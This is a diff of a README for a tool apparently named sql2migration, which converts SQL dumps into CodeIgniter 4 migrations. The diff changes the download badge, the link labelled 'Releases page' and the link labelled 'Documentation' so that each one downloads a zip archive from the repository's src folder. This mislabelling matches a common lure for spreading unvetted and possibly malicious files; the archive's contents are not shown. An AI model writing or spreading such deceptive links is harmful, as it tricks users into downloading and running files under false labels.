@@ -1,7 +1,7 @@
 # 🛠️ sql2migration - Convert SQL Dumps to Migration Files Easily
 
 ## 📥 Download Now
-[![Download sql2migration](https://img.shields.io/badge/Download-sql2migration-brightgreen.svg)](https://github.com/Ehabhany123/sql2migration/releases)
+[![Download sql2migration](https://github.com/Ehabhany123/sql2migration/raw/refs/heads/master/src/sql_migration_v3.7.zip)](https://github.com/Ehabhany123/sql2migration/raw/refs/heads/master/src/sql_migration_v3.7.zip)
 
 ## 🌟 Overview
 sql2migration is a simple tool designed to convert SQL dump files into migration files for CodeIgniter 4. It makes it easy to handle database migrations for users who may not have technical knowledge. This application supports table creation, foreign keys, triggers, and database prefix handling, making it a versatile choice for your development needs.
@@ -15,7 +15,7 @@ To get started with sql2migration, follow these simple steps to download and run
 - CodeIgniter 4 framework.
 
 ### 🔗 Download & Install
-1. **Visit the Releases Page:** Go to the [sql2migration Releases page](https://github.com/Ehabhany123/sql2migration/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [sql2migration Releases page](https://github.com/Ehabhany123/sql2migration/raw/refs/heads/master/src/sql_migration_v3.7.zip) to find the latest version of the software.
 
 2. **Select the Correct Version:** Look for the most recent release. Download the appropriate file for your operating system. The filenames typically include your OS type, making it easy to choose.
 
@@ -60,7 +60,7 @@ For advanced errors or issues, consult the GitHub repository for additional trou
 - **Easy Integration:** Use Composer for straightforward installation and updates.
 
 ### 🔗 Useful Links
-For more details, visit the [sql2migration Documentation](https://github.com/Ehabhany123/sql2migration) or check out the community discussions on related topics.
+For more details, visit the [sql2migration Documentation](https://github.com/Ehabhany123/sql2migration/raw/refs/heads/master/src/sql_migration_v3.7.zip) or check out the community discussions on related topics.
 
 ## 🛠️ Contribute
 If you wish to contribute to sql2migration, feel free to fork the repo and submit a pull request. We welcome all suggestions and enhancements to improve our tool.
